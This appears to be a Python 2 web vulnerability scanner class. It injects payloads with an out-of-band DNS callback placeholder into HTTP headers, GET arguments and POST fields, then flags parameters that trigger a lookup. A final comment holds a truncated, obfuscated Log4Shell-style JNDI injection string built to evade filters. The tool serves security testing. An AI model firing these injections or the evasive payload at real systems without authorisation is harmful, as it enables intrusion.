#!/usr/bin/env python
# -*- coding:utf-8 -*-
import copy

import requests


class urlClass(object):
    # origin :
    # url :
    # param : post 参数
    # args : get 参数

    def __init__(self, origin, url, param, args):
        self.url = url
        self.param = param
        self.args = args
        self.origin = origin

    def getUrl(self):
        return self.url

    def toJson(self, id):
        args = ""
        param = ""
        # print self.args.__class__
        # for i in self.args:
        #    args

        return {
            "id": id,
            "url": self.url,
            "param": ','.join(self.param),
            "args": ','.join(self.args),
            "origin": self.origin,
            "status": "check"
        }

    def sendPacket(self, header, payload):
        if self.param == ['']:
            self.sendByGet(header, payload)
        else:
            self.sendByPost(header, payload)

    # headers : http头
    # payload
    def sendByGet(self, header, payload):
        # 填充GET参数
        params = {}
        print self.url
        url = self.url + "?"
        for key in self.args:
            url += key + "=" + payload.encode("utf-8")
            # params[key] = payload.encode("utf-8")
        print url
        r = requests.get(url,  headers=header)
        return r.text

    def sendByPost(self, header, payload):

        # 填充GET参数
        params = {}
        for key in self.args:
            params[key] = payload.encode("utf-8")

        # 填充POST参数
        data = {}
        for key in self.param:
            data[key] = payload.encode("utf-8")

        r = requests.post(self.url, params=params, headers=header, data=data)

        return r.text

    def headerFill(self, header, payload):
        headers = {}
        for key in header:
            headers[key] = payload.encode("utf-8")

        return headers

    def Fuzzing(self, header, fuzz):
        base = requests.get(self.url)
        if self.param != []:
            curr = self.sendByGet(header, fuzz)
        else:
            curr = self.sendByPost(header, fuzz)

        if curr == base:
            return True
        else:
            return False


    def sendDetail(self, dns, dnsurl, header, checkHeaders, payload):
        # print 1111
        if self.param == ['']:
            return self.sendDetailByGet(dns, header, checkHeaders, payload.encode("utf-8"))
        else:
            return self.sendDetailByPost(dns, header, checkHeaders, payload.encode("utf-8"))


    def sendDetailByGet(self, dns, header, checkHeaders, payload):
        vulnHeader = []
        vulnArgs = []
        # print self.args

        for key in checkHeaders:
            item = payload
            item = item.replace("{{dnsIP}}", "["+dns.req()+"]")
            check = copy.deepcopy(header)
            check[key] = item
            print check
            requests.get(self.url, headers=check)
            res = dns.res()
            print res
            if res:
                vulnHeader.append(key)

        for key in self.args:
            item = payload
            item = item.replace("{{dnsIP}}", "["+dns.req()+"]")
            check = {}
            check[key] = item
            print "GET param: "
            print check
            requests.get(self.url, params=check, headers=header)
            res = dns.res()
            print res
            if res:
                vulnArgs.append(key)
        if len(vulnHeader) == 0 and len(vulnArgs) == 0:
            return {'status': False}
        result = {}
        result['status'] = True
        result['payload'] = payload
        result['vulnHeader'] = ",".join(vulnHeader)
        result['vulnArgs'] = ",".join(vulnArgs)
        result['vulnParam'] = ""
        return result

    def sendDetailByPost(self, dns, header, checkHeaders, payload):
        vulnHeader = []
        vulnArgs = []
        vulnParam = []

        for key in checkHeaders:
            item = payload
            item = item.replace("{{dnsIP}}", "["+dns.req()+"]")
            check = copy.deepcopy(header)
            check[key] = item
            print check

            requests.post(self.url, headers=check)
            res = dns.res()
            print res
            if res:
                vulnHeader.append(key)
        for key in self.args:
            item = payload
            item = item.replace("{{dnsIP}}", "["+dns.req()+"]")
            check = {}
            check[key] = item
            requests.post(self.url, params=check, headers=header)
            res = dns.res()
            print res
            if res:
                vulnArgs.append(key)
        for key in self.param:
            item = payload
            item = item.replace("{{dnsIP}}", "["+dns.req()+"]")
            check = {}
            check[key] = item
            requests.post(self.url, headers=header, data=check)
            res = dns.res()
            print res
            if res:
                vulnParam.append(key)

        if len(vulnHeader) == 0 and len(vulnArgs) == 0 and len(vulnParam) == 0:
            return {'status': False}

        result = {}
        result['status'] = True
        result['payload'] = payload
        result['vulnHeader'] = ",".join(vulnHeader)
        result['vulnArgs'] = ",".join(vulnArgs)
        result['vulnParam'] = ",".join(vulnParam)
        return result

# [truncated]GET /test/?id=$%7B$%7Bdate$%7Bsys:path.separator%7D'j'%7D$%7Bdate$%7Bsys:path.separator%7D'n'%7D$%7Bdate$%7Bsys:path.separator%7D'd'%7D$%7Bdate$%7Bsys:path.separator%7D'i'%7D$%7Bsys:path.separator%7D$%7Bdate$%7Bsys:path.separa
